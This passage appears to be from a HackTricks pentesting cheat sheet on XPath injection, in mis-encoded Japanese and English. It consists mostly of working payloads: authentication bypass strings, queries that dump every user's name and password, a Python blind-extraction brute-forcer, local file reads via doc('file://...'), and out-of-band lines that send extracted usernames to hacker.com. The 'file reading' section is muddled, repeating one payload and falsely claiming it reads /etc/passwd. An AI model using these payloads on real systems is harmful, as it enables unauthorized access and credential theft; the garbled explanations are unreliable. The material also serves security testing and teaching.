//user[@username='' or '1'='1' and @password='' or '1'='1']
```

Since the condition `'1'='1'` always evaluates to true, the authentication check will be bypassed, granting access to the application without a valid username or password.

æ¡ä»¶`'1'='1'`ã¯å¸¸ã«trueã¨è©•ä¾¡ã•ã‚Œã‚‹ãŸã‚ã€èªè¨¼ãƒã‚§ãƒƒã‚¯ã¯ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã€æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã—ã§ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

It is important to note that this technique may not work in all cases, as it depends on the specific implementation of the web application and the way it handles XPath queries. Therefore, thorough testing and analysis are necessary to determine the effectiveness of this attack.

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å…·ä½“çš„ãªå®Ÿè£…ã¨XPathã‚¯ã‚¨ãƒªã®å‡¦ç†æ–¹æ³•ã«ä¾å­˜ã™ã‚‹ãŸã‚ã€ã™ã¹ã¦ã®ã‚±ãƒ¼ã‚¹ã§å‹•ä½œã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æ”»æ’ƒã®åŠ¹æœã‚’åˆ¤æ–­ã™ã‚‹ãŸã‚ã«ã¯ã€å¾¹åº•çš„ãªãƒ†ã‚¹ãƒˆã¨åˆ†æãŒå¿…è¦ã§ã™ã€‚
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **nullã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æ‚ªç”¨**

Null injection is a technique used to exploit XPath injection vulnerabilities in web applications. XPath is a language used to navigate XML documents and is commonly used in web applications to query and extract data from XML-based APIs or databases.

Null injection occurs when an attacker is able to inject a null character (`\x00`) into an XPath query, causing the query to terminate prematurely and potentially bypassing any input validation or filtering mechanisms.

To abuse null injection, an attacker can append the null character to the end of an input parameter that is being used in an XPath query. This can be done by manipulating the input value or by using encoding techniques to represent the null character.

For example, consider the following vulnerable code snippet:

```python
username = request.getParameter("username")
query = "//user[@name='" + username + "']"
result = executeXPathQuery(query)
```

In this code, the `username` parameter is directly concatenated into the XPath query without any sanitization or validation. An attacker can exploit this vulnerability by injecting a null character into the `username` parameter, like this:

```
username = "admin\x00"
```

When the XPath query is executed, it will terminate at the null character, effectively ignoring any characters that come after it. This can allow an attacker to bypass authentication mechanisms, access unauthorized data, or perform other malicious actions.

To prevent null injection attacks, it is important to properly sanitize and validate user input before using it in XPath queries. Input validation should include checking for and removing any null characters or other special characters that could be used to terminate the query prematurely.

Additionally, using parameterized queries or prepared statements can help protect against XPath injection attacks by automatically handling input sanitization and escaping.
```
Username: ' or 1]%00
```
### **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¾ãŸã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ã„ãšã‚Œã‹ã«äºŒé‡ã®OR**ï¼ˆè„†å¼±ãªãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒ1ã¤ã ã‘ã®å ´åˆã«æœ‰åŠ¹ï¼‰

é‡è¦ï¼š**ã€Œandã€ã¯æœ€åˆã«å®Ÿè¡Œã•ã‚Œã‚‹æ“ä½œ**ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2Âº account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## æ–‡å­—åˆ—ã®æŠ½å‡º

å‡ºåŠ›ã«ã¯æ–‡å­—åˆ—ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å€¤ã‚’æ“ä½œã—ã¦æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## ç›²ç›®çš„ãªæ”»æ’ƒ

### **å€¤ã®é•·ã•ã‚’å–å¾—ã—ã€æ¯”è¼ƒã«ã‚ˆã£ã¦æŠ½å‡ºã™ã‚‹:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **Pythonã®ä¾‹**

```python
import requests

def get_user_password(username):
    url = f"http://example.com/login?username={username}&password=1' or '1'='1'--"
    response = requests.get(url)
    if "Welcome" in response.text:
        return "Password found!"
    else:
        return "Password not found!"

username = input("Enter username: ")
result = get_user_password(username)
print(result)
```

ã“ã®Pythonã®ä¾‹ã§ã¯ã€`requests`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦Webã‚µã‚¤ãƒˆã«å¯¾ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚`get_user_password`é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½¿ç”¨ã—ã¦URLã‚’æ§‹ç¯‰ã—ã€ãã®URLã‚’ä»‹ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«`1' or '1'='1'--`ã¨ã„ã†å€¤ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§ã€XPathã‚¯ã‚¨ãƒªã‚’æ”¹ã–ã‚“ã—ã¾ã™ã€‚

ã“ã®æ”»æ’ƒã¯ã€`1'='1'`ã¨ã„ã†æ¡ä»¶ãŒå¸¸ã«çœŸã¨ãªã‚‹ãŸã‚ã€å¸¸ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚‹ã¨ã„ã†çµæœãŒè¿”ã•ã‚Œã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ãƒ†ã‚­ã‚¹ãƒˆã«ã€ŒWelcomeã€ã¨ã„ã†æ–‡å­—åˆ—ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã£ãŸã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¦ã„ã¾ã™ã€‚

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€`Enter username:`ã¨ã„ã†ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã«å¯¾ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å…¥åŠ›ã—ã€çµæœãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿å–ã‚Š

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã®ä¸€ã¤ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦ä»»æ„ã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã‚‚ã®ã§ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã›ãšã«XPathã‚¯ã‚¨ãƒªã«çµ„ã¿è¾¼ã‚€å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’æ”¹ã–ã‚“ã—ã¦ã€æ„å›³ã—ãªã„ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰æ©Ÿå¯†æƒ…å ±ã‚’æŠ½å‡ºã—ãŸã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹æ–¹æ³•ã®ä¾‹ã§ã™ã€‚

```xml
<user>
    <name>admin</name>
    <password>{xpath}</password>
</user>
```

æ”»æ’ƒè€…ã¯ã€`{xpath}`ã®éƒ¨åˆ†ã«ä»¥ä¸‹ã®ã‚ˆã†ãªXPathã‚¯ã‚¨ãƒªã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```xml
' or 1=1 or 'a'='a</password>
```

ã“ã‚Œã«ã‚ˆã‚Šã€XPathã‚¯ã‚¨ãƒªã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

```xml
' or 1=1 or 'a'='a
```

ã“ã®ã‚¯ã‚¨ãƒªã¯å¸¸ã«çœŸã‚’è¿”ã™ãŸã‚ã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```xml
' or 1=1 or 'a'='a</password>
```

æ”»æ’ƒè€…ã¯ã€èª­ã¿å–ã£ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰é‡è¦ãªæƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚ˆã†ãªæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã—ã€é©åˆ‡ãªã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB Exploitation

OOB (Out-of-Band) exploitation is a technique used in XPath injection attacks to extract data from a vulnerable application and send it to an external server controlled by the attacker. This technique is useful when direct retrieval of data is not possible due to restrictions or limitations in the application.

### OOB Techniques

There are several OOB techniques that can be used in XPath injection attacks:

1. **DNS Exfiltration**: This technique involves injecting malicious XPath queries that cause the application to perform DNS lookups to a domain controlled by the attacker. By monitoring the DNS server logs, the attacker can extract the desired data.

2. **HTTP Requests**: In this technique, the attacker injects XPath queries that trigger HTTP requests to a server controlled by them. The server logs can then be analyzed to extract the data sent by the application.

3. **SMTP Requests**: This technique involves injecting XPath queries that trigger SMTP requests to an email server controlled by the attacker. The attacker can then receive the extracted data via email.

### OOB Exploitation Tools

There are various tools available for OOB exploitation in XPath injection attacks. Some popular ones include:

- **Burp Suite**: Burp Suite is a widely used web application testing tool that includes features for OOB exploitation, such as the ability to intercept and modify HTTP requests.

- **XXEinjector**: XXEinjector is a powerful tool specifically designed for exploiting XXE (XML External Entity) vulnerabilities, which can be used in conjunction with XPath injection attacks.

- **Out-of-Band Toolkit**: This toolkit is a collection of scripts and tools that can be used for OOB exploitation in various scenarios, including XPath injection attacks.

### Conclusion

OOB exploitation is a valuable technique in XPath injection attacks, allowing attackers to extract data from vulnerable applications in situations where direct retrieval is not possible. By understanding and utilizing OOB techniques and tools, hackers can effectively exploit XPath injection vulnerabilities and gain unauthorized access to sensitive information.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### è‡ªå‹•ãƒ„ãƒ¼ãƒ«

{% embed url="https://xcat.readthedocs.io/" %}

## å‚è€ƒæ–‡çŒ®

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿ** ã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
